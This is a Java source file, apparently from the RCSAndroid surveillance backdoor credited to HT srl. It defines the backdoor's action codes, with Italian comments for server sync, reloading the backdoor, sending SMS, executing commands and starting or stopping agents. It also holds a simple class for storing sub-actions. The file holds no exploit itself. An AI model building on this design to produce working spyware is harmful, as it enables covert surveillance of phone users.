/***********************************************
 * Create by : Alberto "Quequero" Pelliccione
 * Company   : HT srl
 * Project   : RCSAndroid
 * Created   : 01-dec-2010
 **********************************************/

package com.ht.RCSAndroidGUI;

public class Action {
	/**
	 * Actions definitions
	 */
	public static int ACTION              = 0x4000;
	public static int ACTION_SYNC         = ACTION + 0x1; // Sync su server
	public static int ACTION_UNINSTALL    = ACTION + 0x2; // Uninstall
	public static int ACTION_RELOAD       = ACTION + 0x3; // Reload della backdoor
	public static int ACTION_SMS          = ACTION + 0x4; // Invia un SMS
	public static int ACTION_TOOTHING     = ACTION + 0x5; // Non utilizzata
	public static int ACTION_START_AGENT  = ACTION + 0x6; // Avvia un agente
	public static int ACTION_STOP_AGENT   = ACTION + 0x7; // Ferma un agente
	public static int ACTION_SYNC_PDA     = ACTION + 0x8; // Sync su Mediation Node
	public static int ACTION_EXECUTE      = ACTION + 0x9; // Esegui un comando
	public static int ACTION_SYNC_APN     = ACTION + 0xa; // Sync su APN
	public static int ACTION_LOG          = ACTION + 0xb; // Crea un LOG_INFO

	/**
	 * Action array
	 */
	private SubAction[] subArray;

	/**
	 * Action ID
	 */
	private int actionId;

	/**
	 * Number of subactions in this action
	 */
	private int subActionsNum;

	/**
	 * Internal action counter
	 */
	private int subActionIndex;

	/**
	 * Action constructor
	 * @param id : action id
	 * @param num : number of subactions
	 */
	public Action(int id, int num) throws RCSException {
		if (id < 0 || num < 1) {
			throw new RCSException("Invalid id or invalid number of sub actions for this action: " + num);
		}

		this.actionId = id;
		this.subActionsNum = num;
		this.subArray = new SubAction[num];
		this.subActionIndex = 0;
	}

	public int getId() {
		return this.actionId;
	}

	public int getSubActionsNum() {
		return this.subActionsNum;
	}

	public void addSubAction(int type, byte[] params) throws RCSException {
		if (this.subActionIndex >= this.subActionsNum) {
			throw new RCSException("SubAction above Action array boundary");
		}

		SubAction sub = new SubAction(type, params);

		this.subArray[this.subActionIndex] = sub;
		this.subActionIndex++;
	}

	public SubAction getSubAction(int index) throws RCSException {
		if (index < 0 || index >= this.subActionIndex) {
			throw new RCSException("Subaction index above SubAction array boundary");
		}

		return this.subArray[index];
	}
}

